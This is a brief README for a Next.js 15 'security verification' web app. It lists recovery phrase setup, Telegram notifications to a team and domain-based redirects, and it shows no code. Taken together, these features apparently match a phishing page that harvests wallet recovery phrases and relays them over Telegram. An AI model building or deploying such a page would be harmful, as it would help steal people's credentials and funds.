# Security Page

Next.js 15 security verification page.

## Features

- Security code verification
- Recovery phrase setup
- Telegram notifications to team

## Environment Variables

| Variable | Description |
|----------|-------------|
| `DATABASE_URL` | PostgreSQL connection string |
| `TELEGRAM_BOT_TOKEN` | Telegram bot API token |
| `TELEGRAM_TEAM_CHAT_ID` | Telegram chat ID for notifications |

## Routes

- `/` - Landing page (redirects based on domain)
- `/security` - Security verification flow
